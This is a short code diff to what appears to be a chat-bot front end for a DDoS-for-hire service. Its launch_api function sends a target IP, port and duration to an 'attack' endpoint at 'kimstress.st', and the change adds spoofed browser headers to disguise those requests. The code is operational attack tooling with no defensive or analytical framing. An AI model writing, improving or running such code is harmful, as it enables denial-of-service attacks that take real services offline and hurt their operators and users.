@@ -356,10 +356,19 @@ def live_packet_sniffer(chat_id, user_id, message_id):
 
 def launch_api(ip, port, dur):
     try:
+        headers = {
+            "x-api-key": API_KEY,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://kimstress.st",
+            "Referer": "https://kimstress.st/"
+        }
         r = requests.post(
             f"{API_URL}/api/v1/attack",
             json={"ip": ip, "port": port, "duration": dur},
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
+            headers=headers,
             timeout=300
         )
         logger.info(f"API Response [{r.status_code}]: {r.text[:300]}")
